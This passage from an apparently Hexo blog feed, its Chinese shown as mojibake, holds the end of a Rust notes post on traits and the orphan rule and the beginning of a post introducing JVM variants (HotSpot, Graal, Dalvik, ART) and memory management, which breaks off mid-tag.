id="ä¸ºç±»å‹å®ç°ç‰¹å¾"><a href="#ä¸ºç±»å‹å®ç°ç‰¹å¾" class="headerlink" title="ä¸ºç±»å‹å®ç°ç‰¹å¾"></a>ä¸ºç±»å‹å®ç°ç‰¹å¾</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">trait</span> <span class="token class-name">Summary</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Post</span> <span class="token punctuation">{</span>    <span class="token keyword">pub</span> title<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// æ ‡é¢˜</span>    <span class="token keyword">pub</span> author<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// ä½œè€…</span>    <span class="token keyword">pub</span> content<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// å†…å®¹</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span> <span class="token keyword">for</span> <span class="token class-name">Post</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>        <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"æ–‡ç« {}, ä½œè€…æ˜¯{}"</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>title<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>author<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Weibo</span> <span class="token punctuation">{</span>    <span class="token keyword">pub</span> username<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    <span class="token keyword">pub</span> content<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span> <span class="token keyword">for</span> <span class="token class-name">Weibo</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>        <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"{}å‘è¡¨äº†å¾®åš{}"</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·çš„è®¾è®¡è®©Rustå®ç°Kotliné‚£æ ·çš„æ‹“å±•å‡½æ•°æˆä¸ºå¯èƒ½ã€‚</p><h3 id="å­¤å„¿åŸåˆ™"><a href="#å­¤å„¿åŸåˆ™" class="headerlink" title="å­¤å„¿åŸåˆ™"></a>å­¤å„¿åŸåˆ™</h3><blockquote><p>ä¸Šé¢æˆ‘ä»¬å°† <code>Summary</code> å®šä¹‰æˆäº† <code>pub</code> å…¬å¼€çš„ã€‚è¿™æ ·ï¼Œå¦‚æœä»–äººæƒ³è¦ä½¿ç”¨æˆ‘ä»¬çš„ <code>Summary</code> ç‰¹å¾ï¼Œåˆ™å¯ä»¥å¼•å…¥åˆ°ä»–ä»¬çš„åŒ…ä¸­ï¼Œç„¶åå†è¿›è¡Œå®ç°ã€‚</p><p>å…³äºç‰¹å¾å®ç°ä¸å®šä¹‰çš„ä½ç½®ï¼Œæœ‰ä¸€æ¡éå¸¸é‡è¦çš„åŸåˆ™ï¼š<strong>å¦‚æœä½ æƒ³è¦ä¸ºç±»å‹ <code>A</code> å®ç°ç‰¹å¾ <code>T</code>ï¼Œé‚£ä¹ˆ <code>A</code> æˆ–è€… <code>T</code> è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯åœ¨å½“å‰ä½œç”¨åŸŸä¸­å®šä¹‰çš„ï¼</strong>ã€‚ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä¸ºä¸Šé¢çš„ <code>Post</code> ç±»å‹å®ç°æ ‡å‡†åº“ä¸­çš„ <code>Display</code> ç‰¹å¾ï¼Œè¿™æ˜¯å› ä¸º <code>Post</code> ç±»å‹å®šä¹‰åœ¨å½“å‰çš„ä½œç”¨åŸŸä¸­ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨å½“å‰åŒ…ä¸­ä¸º <code>String</code> ç±»å‹å®ç° <code>Summary</code> ç‰¹å¾ï¼Œå› ä¸º <code>Summary</code> å®šä¹‰åœ¨å½“å‰ä½œç”¨åŸŸä¸­ã€‚</p><p>ä½†æ˜¯ä½ æ— æ³•åœ¨å½“å‰ä½œç”¨åŸŸä¸­ï¼Œä¸º <code>String</code> ç±»å‹å®ç° <code>Display</code> ç‰¹å¾ï¼Œå› ä¸ºå®ƒä»¬ä¿©éƒ½å®šä¹‰åœ¨æ ‡å‡†åº“ä¸­ï¼Œå…¶å®šä¹‰æ‰€åœ¨çš„ä½ç½®éƒ½ä¸åœ¨å½“å‰ä½œç”¨åŸŸï¼Œè·Ÿä½ åŠæ¯›é’±å…³ç³»éƒ½æ²¡æœ‰ï¼Œçœ‹çœ‹å°±è¡Œäº†ã€‚</p><p>è¯¥è§„åˆ™è¢«ç§°ä¸º<strong>å­¤å„¿è§„åˆ™</strong>ï¼Œå¯ä»¥ç¡®ä¿å…¶å®ƒäººç¼–å†™çš„ä»£ç ä¸ä¼šç ´åä½ çš„ä»£ç ï¼Œä¹Ÿç¡®ä¿äº†ä½ ä¸ä¼šè«åå…¶å¦™å°±ç ´åäº†é£é©¬ç‰›ä¸ç›¸åŠçš„ä»£ç ã€‚</p></blockquote><h3 id="å½¢å‚çº¦æŸ"><a href="#å½¢å‚çº¦æŸ" class="headerlink" title="å½¢å‚çº¦æŸ"></a>å½¢å‚çº¦æŸ</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">notify</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Breaking news! {}"</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span><span class="token function">summarize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// å¤šé‡çº¦æŸ</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">notify</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token keyword">impl</span> <span class="token class-name">Summary</span> <span class="token operator">+</span> <span class="token class-name">Display</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span class="token comment">// ä¸ä½¿ç”¨whereçº¦æŸ</span><span class="token keyword">fn</span> <span class="token function-definition function">some_function</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">Display</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token punctuation">:</span> <span class="token class-name">Clone</span> <span class="token operator">+</span> <span class="token class-name">Debug</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>t<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">,</span> u<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">U</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">i32</span> <span class="token punctuation">{</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span class="token comment">// ä½¿ç”¨whereçº¦æŸ</span><span class="token keyword">fn</span> <span class="token function-definition function">some_function</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>t<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">,</span> u<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">U</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">i32</span>    <span class="token keyword">where</span> <span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">Display</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span>          <span class="token class-name">U</span><span class="token punctuation">:</span> <span class="token class-name">Clone</span> <span class="token operator">+</span> <span class="token class-name">Debug</span><span class="token punctuation">{</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è™½ç„¶ <code>impl Trait</code> è¿™ç§è¯­æ³•éå¸¸å¥½ç†è§£ï¼Œä½†æ˜¯å®é™…ä¸Šå®ƒåªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼š</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">notify</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">Summary</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Breaking news! {}"</span><span class="token punctuation">,</span> item<span class="token punctuation">.</span><span class="token function">summarize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>// TODO</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Rustå­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…å…¥æµ…å‡ºJVM</title>
      <link href="/2022/09/03/simple-in-simple-out-jvm/"/>
      <url>/2022/09/03/simple-in-simple-out-jvm/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ…å…¥æµ…å‡ºJVM-amp-Hook"><a href="#æµ…å…¥æµ…å‡ºJVM-amp-Hook" class="headerlink" title="æµ…å…¥æµ…å‡ºJVM &amp; Hook"></a>æµ…å…¥æµ…å‡ºJVM &amp; Hook</h1><blockquote><p>å…¶ä¸­æ··æ‚æœ‰ç›¸å½“å¤šçš„ä¸ªäººç†è§£ï¼Œå¦‚æœ‰è°¬è¯¯çƒ¦è¯·å­¦é•¿æŒ‡æ­£</p></blockquote><h2 id="ä»€ä¹ˆæ˜¯JVM"><a href="#ä»€ä¹ˆæ˜¯JVM" class="headerlink" title="ä»€ä¹ˆæ˜¯JVM"></a>ä»€ä¹ˆæ˜¯JVM</h2><p><strong>Java Virtual Machine</strong>ï¼Œå³Javaè™šæ‹Ÿæœºã€‚é‚£ä¹ˆè™šæ‹Ÿæœºåˆæ˜¯ä»€ä¹ˆï¼Ÿ</p><blockquote><p>è™šæ‹Ÿæœºï¼ˆVirtual Machineï¼‰æŒ‡é€šè¿‡è½¯ä»¶æ¨¡æ‹Ÿçš„å…·æœ‰å®Œæ•´ç¡¬ä»¶ç³»ç»ŸåŠŸèƒ½çš„ã€è¿è¡Œåœ¨ä¸€ä¸ªå®Œå…¨éš”ç¦»ç¯å¢ƒä¸­çš„å®Œæ•´è®¡ç®—æœºç³»ç»Ÿã€‚</p></blockquote><p>ä½†ä¸åŒäºå…¶ä»–è™šæ‹Ÿæœºçš„æ˜¯ï¼ŒJVMæ¨¡æ‹Ÿçš„æ˜¯ä¸€ä¸ªæ— æ³•ç›´æ¥åœ¨ç¡¬ä»¶è®¾å¤‡ä¸Šå®‰è£…çš„è®¡ç®—æœºç³»ç»Ÿâ€”â€”ç©¶å…¶æ ¹æœ¬ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªåœ¨å„ä¸ªç³»ç»Ÿä¸­å…·æœ‰åŸºæœ¬ç›¸åŒè¡Œä¸ºçš„<strong>è·¨å¹³å°ç¨‹åº</strong>ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—å¯ä¾›Javaè¯­è¨€è°ƒç”¨çš„APIï¼Œè€Œè¿™äº›APIéƒ½å¯ä»¥æº¯æºåˆ°<strong>æœ¬åœ°æ–¹æ³•</strong>(ä¹Ÿå°±æ˜¯nativeä¿®é¥°çš„æ–¹æ³•)ã€‚è¿™äº›æ–¹æ³•åœ¨nativeè¯­è¨€å±‚é¢å®ç°ï¼Œä¸”åœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šæœ‰ç€ä¸åŒé€»è¾‘çš„å®ç°ã€‚ä½†æŠ½è±¡åˆ°javaè¯­è¨€å±‚é¢ï¼Œå®ƒä»¬çš„ä½œç”¨æ˜¯ä¸€è‡´çš„ã€‚</p><p>å°±è¿™æ ·ï¼ŒJVMä¸ºæˆ‘ä»¬åœ¨å„ä¸ªç³»ç»Ÿæä¾›äº†ä¸€ä¸ªå…·æœ‰ç»Ÿä¸€â€œç³»ç»Ÿâ€œçš„è™šæ‹Ÿæœºç¯å¢ƒï¼Œæˆ‘ä»¬ä¸éœ€è¦è®©å¤–éƒ¨çš„å®é™…ç³»ç»Ÿè®¤è¯†æˆ‘ä»¬çš„ç¼–è¯‘å‡ºæ¥çš„è½¯ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦è®©JVMè®¤è¯†å®ƒå°±å¯ä»¥äº†ã€‚æ¯å½“æˆ‘ä»¬ä½¿ç”¨<code>java -jar</code>å‘½ä»¤è¿è¡Œä¸€ä¸ªjaræ–‡ä»¶, å®é™…ä¸Šéƒ½å…ˆè¿è¡Œäº†JVMï¼Œå†ç”±JVMæ¥<strong>è¿è¡Œæ—¶</strong>çš„è§£é‡Šå¹¶åŠ è½½jaråŒ…ä¸­çš„ç±»æ–‡ä»¶ï¼Œå¹¶é€šè¿‡META-INFä¸­çš„ä¸»ç±»ä¿¡æ¯æ‰¾åˆ°ä¸»ç±»å¹¶æ‰§è¡Œå…¶ä¸­çš„mainæ–¹æ³•ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨Javaç­‰ä¾èµ–äºJVMçš„è¯­è¨€ç¼–å†™ç¨‹åºæ—¶å¦‚æœåªè°ƒç”¨Javaè¯­è¨€ä¸ºæˆ‘ä»¬æä¾›çš„APIï¼Œæˆ‘ä»¬ç¼–å†™çš„ä»£ç å°±å¯ä»¥åœ¨ä¸€åˆ‡æ”¯æŒJVMçš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚æ­£æ‰€è°“ <em><strong>Write once, run anywhere</strong></em>ã€‚ä½ ä¼šå‘ç°å¾ˆå¤šç›´æ¥ç¼–è¯‘ä¸ºnativeçš„è¯­è¨€(C, C++, Rust, Goâ€¦)ç”šè‡³éœ€è¦åœ¨å¯¹åº”çš„ç³»ç»Ÿç¼–è¯‘æ‰èƒ½è¿è¡Œï¼Œè¿™ä¹Ÿæ­£æ˜¯JVMç³»è¯­è¨€ç›¸å¯¹äºå…¶ä»–è¯­è¨€çš„ä¼˜åŠ¿ä¹‹ä¸€ã€‚</p><h2 id="JVMçš„ç§ç±»"><a href="#JVMçš„ç§ç±»" class="headerlink" title="JVMçš„ç§ç±»"></a>JVMçš„ç§ç±»</h2><p>è¿™é‡Œä»‹ç»ä¸»è¦çš„å‡ ç§</p><h3 id="Sun-Classic-VM"><a href="#Sun-Classic-VM" class="headerlink" title="Sun Classic VM"></a>Sun Classic VM</h3><blockquote><p>ä¸‡ç‰©ä¼Šå§‹</p></blockquote><p>å…¶ä¸­ä½¿ç”¨çš„æŠ€æœ¯åœ¨ä»Šå¤©çœ‹æ¥å·²ç»ç›¸å½“åŸå§‹ï¼Œè¿™æ¬¾è™šæ‹Ÿæœºçš„ä½¿å‘½ä¹Ÿæ—©å·²ç»ˆç»“ï¼Œä½†å‡­å®ƒâ€ä¸–ç•Œä¸Šç¬¬ä¸€æ¬¾å•†ç”¨Javaè™šæ‹Ÿæœºâ€œçš„å¤´è¡”ï¼Œä¾¿è¶³ä»¥è®©å®ƒè¢«å†å²é“­è®°ã€‚</p><h3 id="HotSpot-VM"><a href="#HotSpot-VM" class="headerlink" title="HotSpot VM"></a>HotSpot VM</h3><blockquote><p>æ­¦æ—ç›Ÿä¸»</p></blockquote><p>æ¯«æ— ç–‘é—®æ˜¯å½“ä»Šè¢«æœ€å¹¿æ³›ä½¿ç”¨çš„Javaè™šæ‹Ÿæœº</p><h3 id="Graal-VM"><a href="#Graal-VM" class="headerlink" title="Graal VM"></a>Graal VM</h3><blockquote><p>æ˜æ—¥ä¹‹æ˜Ÿ</p></blockquote><p>åˆ›é€ æ€§çš„å°†å­—èŠ‚ç ç¼–è¯‘ä¸ºå¦ä¸€ç§ä¸­é—´åª’ä»‹ï¼ŒåŒæ—¶æ”¯æŒå°†å…¶ä»–è¯­è¨€ç¼–è¯‘ä¸ºè¿™ç§ä¸­é—´åª’ä»‹ï¼Œå®ç°å¤šè¯­è¨€ä¹‹é—´çš„ç›¸äº’è°ƒç”¨ï¼ŒJVMå°†ä¸å†ä¸“å±äºå­—èŠ‚ç ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥åœ¨Javaä¸­ä½¿ç”¨Node.jsçš„Expressæ¡†æ¶æ¥å¼€å‘åç«¯ç¨‹åºã€‚</p><h3 id="Dalvik-VM"><a href="#Dalvik-VM" class="headerlink" title="Dalvik VM"></a>Dalvik VM</h3><blockquote><p>ä¸ºAndroidè€Œç”Ÿ</p></blockquote><blockquote><p>Dalvikæ˜¯<a href="https://baike.baidu.com/item/Google/86964">Google</a>å…¬å¸è‡ªå·±è®¾è®¡ç”¨äºAndroidå¹³å°çš„<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA/104440">è™šæ‹Ÿæœº</a>ã€‚Dalvikè™šæ‹Ÿæœºæ˜¯Googleç­‰å‚å•†åˆä½œå¼€å‘çš„Androidç§»åŠ¨è®¾å¤‡å¹³å°çš„æ ¸å¿ƒç»„æˆéƒ¨åˆ†ä¹‹ä¸€ã€‚å®ƒå¯ä»¥æ”¯æŒå·²è½¬æ¢ä¸º .dexï¼ˆå³Dalvik Executableï¼‰æ ¼å¼çš„Javaåº”ç”¨ç¨‹åºçš„è¿è¡Œï¼Œ.dexæ ¼å¼æ˜¯ä¸“ä¸ºDalvikè®¾è®¡çš„ä¸€ç§<a href="https://baike.baidu.com/item/%E5%8E%8B%E7%BC%A9%E6%A0%BC%E5%BC%8F/2844535">å‹ç¼©æ ¼å¼</a>ï¼Œé€‚åˆå†…å­˜å’Œå¤„ç†å™¨é€Ÿåº¦æœ‰é™çš„ç³»ç»Ÿã€‚Dalvik ç»è¿‡ä¼˜åŒ–ï¼Œå…è®¸åœ¨æœ‰é™çš„å†…å­˜ä¸­åŒæ—¶è¿è¡Œå¤šä¸ªè™šæ‹Ÿæœºçš„å®ä¾‹ï¼Œå¹¶ä¸”æ¯ä¸€ä¸ªDalvik åº”ç”¨ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„Linux è¿›ç¨‹æ‰§è¡Œã€‚ç‹¬ç«‹çš„è¿›ç¨‹å¯ä»¥é˜²æ­¢åœ¨è™šæ‹Ÿæœºå´©æºƒçš„æ—¶å€™æ‰€æœ‰ç¨‹åºéƒ½è¢«å…³é—­ã€‚</p><p>å¾ˆé•¿æ—¶é—´ä»¥æ¥ï¼ŒDalvikè™šæ‹Ÿæœºä¸€ç›´è¢«ç”¨æˆ·æŒ‡è´£ä¸ºæ‹–æ…¢å®‰å“ç³»ç»Ÿè¿è¡Œé€Ÿåº¦ä¸å¦‚IOSçš„æ ¹æºã€‚</p><p>2014å¹´6æœˆ25æ—¥ï¼ŒAndroid L æ­£å¼äº®ç›¸äºå¬å¼€çš„è°·æ­ŒI/Oå¤§ä¼šï¼ŒAndroid L æ”¹åŠ¨å¹…åº¦è¾ƒå¤§ï¼Œ<a href="https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C/117920">è°·æ­Œ</a>å°†ç›´æ¥åˆ é™¤Dalvikï¼Œä»£æ›¿å®ƒçš„æ˜¯ä¼ é—»å·²ä¹…çš„ARTã€‚</p></blockquote><h3 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h3><blockquote><p>ART(Android Runtime)æ˜¯Android 4.4å‘å¸ƒçš„ï¼Œç”¨æ¥æ›¿æ¢Dalvikè™šæ‹Ÿï¼ŒAndroid 4.4ä¹‹å‰é»˜è®¤é‡‡ç”¨çš„è¿˜æ˜¯DVMï¼Œç³»ç»Ÿä¼šæä¾›ä¸€ä¸ªé€‰é¡¹æ¥å¼€å¯ARTæ¨¡å¼ã€‚åœ¨Android 5.0æ—¶ï¼Œé»˜è®¤é‡‡ç”¨ARTï¼ŒDVMä»æ­¤é€€å‡ºå†å²èˆå°ã€‚</p></blockquote><p><strong>Dalvikè™šæ‹Ÿæœºæ‰§è¡Œçš„æ˜¯dexå­—èŠ‚ç ï¼ŒARTè™šæ‹Ÿæœºæ‰§è¡Œçš„æ˜¯æœ¬åœ°æœºå™¨ç ã€‚</strong></p><blockquote><p>Dalvikæ‰§è¡Œçš„æ˜¯dexå­—èŠ‚ç ï¼Œä¾é JITç¼–è¯‘å™¨å»è§£é‡Šæ‰§è¡Œï¼Œè¿è¡Œæ—¶åŠ¨æ€åœ°å°†æ‰§è¡Œé¢‘ç‡å¾ˆé«˜çš„dexå­—èŠ‚ç ç¿»è¯‘æˆæœ¬åœ°æœºå™¨ç ï¼Œç„¶ååœ¨æ‰§è¡Œï¼Œä½†æ˜¯å°†dexå­—èŠ‚ç ç¿»è¯‘æˆæœ¬åœ°æœºå™¨ç æ˜¯å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºæ¯ä¸€æ¬¡é‡æ–°è¿è¡Œçš„æ—¶å€™ï¼Œéƒ½è¦é‡æ–°åšè¿™ä¸ªç¿»è¯‘å·¥ä½œï¼Œå› æ­¤ï¼Œå³ä½¿é‡‡ç”¨äº†JITï¼ŒDalvikè™šæ‹Ÿæœºçš„æ€»ä½“æ€§èƒ½è¿˜æ˜¯ä¸èƒ½ä¸ç›´æ¥æ‰§è¡Œæœ¬åœ°æœºå™¨ç çš„ARTè™šæ‹Ÿæœºç›¸æ¯”ã€‚ å®‰å“è¿è¡Œæ—¶ä»Dalvikè™šæ‹Ÿæœºæ›¿æ¢æˆARTè™šæ‹Ÿæœºï¼Œå¹¶ä¸è¦æ±‚å¼€å‘è€…é‡æ–°å°†è‡ªå·±çš„åº”ç”¨ç›´æ¥ç¼–è¯‘æˆç›®æ ‡æœºå™¨ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåº”ç”¨ç¨‹åºä»ç„¶æ˜¯ä¸€ä¸ªåŒ…å«dexå­—èŠ‚ç çš„apkæ–‡ä»¶ã€‚æ‰€ä»¥åœ¨å®‰è£…åº”ç”¨çš„æ—¶å€™ï¼Œdexä¸­çš„å­—èŠ‚ç å°†è¢«ç¼–è¯‘æˆæœ¬åœ°æœºå™¨ç ï¼Œä¹‹åæ¯æ¬¡æ‰“å¼€åº”ç”¨ï¼Œæ‰§è¡Œçš„éƒ½æ˜¯æœ¬åœ°æœºå™¨ç ã€‚ç§»é™¤äº†è¿è¡Œæ—¶çš„è§£é‡Šæ‰§è¡Œï¼Œæ•ˆç‡æ›´é«˜ï¼Œå¯åŠ¨æ›´å¿«ã€‚ï¼ˆå®‰å“åœ¨4.4ä¸­å‘å¸ƒäº†ARTè¿è¡Œæ—¶ï¼‰</p></blockquote><p>ARTä¼˜ç‚¹:</p><ul><li>ç³»ç»Ÿæ€§èƒ½æ˜¾è‘—æå‡</li><li>åº”ç”¨å¯åŠ¨æ›´å¿«ã€è¿è¡Œæ›´å¿«ã€ä½“éªŒæ›´æµç•…ã€è§¦æ„Ÿåé¦ˆæ›´åŠæ—¶</li><li>ç»­èˆªèƒ½åŠ›æå‡</li><li>æ”¯æŒæ›´ä½çš„ç¡¬ä»¶</li></ul><p>ARTç¼ºç‚¹:</p><ul><li>æ›´å¤§çš„å­˜å‚¨ç©ºé—´å ç”¨ï¼Œå¯èƒ½å¢åŠ 10%-20%</li><li>æ›´é•¿çš„åº”ç”¨å®‰è£…æ—¶é—´</li></ul><blockquote><p>åº”å»–è€å¸ˆçš„è¦æ±‚ï¼Œè®²è®²ARTçš„GC</p></blockquote><p>// TODO å†…å®¹å¥½å¤šï¼Œæˆ‘å¤ªéš¾äº†</p><h2 id="è‡ªè¡Œç¼–è¯‘JDK8"><a href="#è‡ªè¡Œç¼–è¯‘JDK8" class="headerlink" title="è‡ªè¡Œç¼–è¯‘JDK8"></a>è‡ªè¡Œç¼–è¯‘JDK8</h2><p>éå¸¸éº»çƒ¦ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ—¶é—´å»åšã€‚è‡ªè¡Œç¼–è¯‘jvmå¯ä»¥å¯¹jvmæ‰“æ–­ç‚¹ï¼Œè¿˜æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚</p><p>// TODO</p><h2 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h2><p>å¯¹äºä»äº‹Cï¼ŒC++ç¨‹åºå¼€å‘çš„å¼€å‘äººå‘˜ï¼Œåœ¨å†…å­˜ç®¡ç†é¢†åŸŸï¼Œä»–ä»¬éœ€è¦æ‰‹åŠ¨åˆ†é…/é‡Šæ”¾å†…å­˜ã€‚è™½ç„¶è¿™æ˜¯ä¸€ä»¶ç¹ççš„å·¥ä½œï¼Œä½†è¿™ä¹Ÿä½¿C++ç­‰ä¸€ç³»åˆ—éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜çš„è¯­è¨€èƒ½åšåˆ°æ›´å¤šçš„äº‹æƒ…ã€‚ä¾‹å¦‚MMKVï¼Œå®ƒçš„åº•å±‚åŸç†ä½¿ç”¨C++å®ç°â€”â€”æ‰‹åŠ¨ç®¡ç†äº†ä¸€å—å †å¤–å†…å­˜ã€‚(ä½†å…¶å®Javaä¹Ÿå¹¶éåšä¸åˆ°è¿™ä¸ªï¼ŒUnsafeç±»ä¸­æä¾›äº†æ‰‹åŠ¨åˆ†é…/é‡Šæ”¾å †å¤–å†…å­˜çš„æ–¹æ³•ï¼Œå¹¶ä¸”æä¾›äº†è·ŸC++ä¸€æ ·çš„é¢å‘æŒ‡é’ˆçš„æ“ä½œæ–¹æ³•ã€‚)</p><p>å¾—ç›ŠäºJVMå¼ºå¤§çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒJVMè¯­è¨€ç¨‹åºå‘˜ä¸éœ€è¦æ‰‹åŠ¨ä¸ºæ¯ä¸ªå¯¹è±¡åˆ†é…/é‡Šæ”¾å †å†…å­˜ï¼Œä¸€åˆ‡çœ‹èµ·æ¥ç›¸å½“ç¾å¥½ã€‚ä½†æ­£æ˜¯å› ä¸ºæˆ‘ä»¬å°†å†…å­˜ç®¡ç†çš„ç¨‹åºäº¤ç»™äº†JVMï¼Œä¸€æ—¦å‡ºç°å†…å­˜æ³„æ¼çš„é—®é¢˜ï¼Œå¦‚æœä¸æ¸…æ¥šJVMå†…å­˜ç®¡ç†æœºåˆ¶çš„åŸç†å°±å¾ˆéš¾è§£å†³é—®é¢˜ã€‚</p><h3 id="è¿è¡Œæ—¶æ•°æ®åŒº"><a href="#è¿è¡Œæ—¶æ•°æ®åŒº" class="headerlink" title="è¿è¡Œæ—¶æ•°æ®åŒº"></a>è¿è¡Œæ—¶æ•°æ®åŒº</h3><p>Javaè™šæ‹Ÿæœºåœ¨æ‰§è¡ŒJavaç¨‹åºçš„è¿‡ç¨‹ä¸­ä¼šæŠŠå®ƒç®¡ç†çš„å†…å­˜åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªä¸åŒçš„æ•°æ®åŒºåŸŸ:</p><p><img 